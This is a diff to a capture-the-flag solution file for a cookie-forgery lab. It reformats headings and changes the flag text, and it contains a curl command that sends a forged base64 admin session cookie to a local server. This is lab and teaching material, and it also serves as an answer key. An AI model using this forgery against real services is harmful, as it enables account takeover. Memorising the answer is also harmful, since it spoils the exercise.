@@ -1,9 +1,9 @@
-Solution: A07 - COOKIE FORGERY
+# Solution: A07 - COOKIE FORGERY
 
-Concept  
+## Concept
 Client-side session forgery without cryptographic integrity validation.
 
-Walkthrough  
+## Walkthrough
 1. Inspect the initial cookie:
    `session=eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4ifQ==`
 2. Base64-decode:
@@ -20,7 +20,7 @@ Walkthrough
    ```bash
    curl -H "Cookie: session=eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ==" http://localhost:5001/
    ```
-6. The server returns `flag{tampered session token}`.
+6. The server returns `tampered session token`.
 
-Flag  
-`flag{tampered session token}`
+## Flag
+`tampered session token`
